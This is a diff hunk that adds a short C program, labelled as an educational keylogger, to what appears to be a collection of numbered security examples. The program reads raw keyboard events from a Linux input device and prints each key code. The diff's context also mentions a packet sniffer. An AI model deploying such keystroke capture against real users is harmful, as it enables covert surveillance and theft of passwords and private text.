@@ -126,3 +126,26 @@ int main() {
 // sudo ./sniffer
 ---------------------------------------------
 // 5. Simple Keylogger (Educational): Shows keyboard event reading.
+
+   // keylogger.c
+#include <stdio.h>
+#include <fcntl.h>
+#include <linux/input.h>
+#include <unistd.h>
+
+int main() {
+    struct input_event ev;
+    int fd = open("/dev/input/event0", O_RDONLY);
+
+    while(1) {
+        read(fd, &ev, sizeof(ev));
+
+        if(ev.type == EV_KEY)
+            printf("Key: %d\n", ev.code);
+    }
+
+    close(fd);
+
+    return 0;
+}
+--------------------------------------------------
